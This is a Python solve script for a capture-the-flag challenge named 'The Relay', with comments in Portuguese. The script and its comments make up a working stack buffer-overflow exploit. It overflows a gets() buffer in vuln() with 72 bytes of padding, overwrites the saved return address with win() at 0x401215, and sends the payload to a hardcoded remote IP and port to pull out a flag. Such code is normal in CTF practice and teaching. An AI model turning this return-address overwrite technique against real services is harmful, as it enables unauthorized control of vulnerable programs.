#!/usr/bin/env python3
"""
The Relay — ret2win (CSS CTF)
Buffer overflow via gets() em vuln(); redireciona o retorno para win().

  Layout da pilha em vuln():
    buffer[64]  ->  -0x40(%rbp)
    saved RBP    ->  8 bytes
    saved RIP    ->  offset 72   <- sobrescrito

  win() @ 0x401215 (binario remoto, non-PIE)

Uso: python3 solve_the_relay.py [host] [port] [win_addr_hex]
"""
import socket, struct, sys, time

HOST = sys.argv[1] if len(sys.argv) > 1 else "34.116.80.78"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9998
WIN  = int(sys.argv[3], 16) if len(sys.argv) > 3 else 0x401215
OFFSET = 72

payload = b"A" * OFFSET + struct.pack("<Q", WIN) + b"\n"

s = socket.create_connection((HOST, PORT), timeout=10)
s.settimeout(10)
time.sleep(0.3)
s.sendall(payload)

data = b""
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
except socket.timeout:
    pass
s.close()

out = data.decode(errors="replace")
print(out)
for line in out.splitlines():
    if "CSSCTF{" in line:
        print("[+] FLAG:", line.strip())
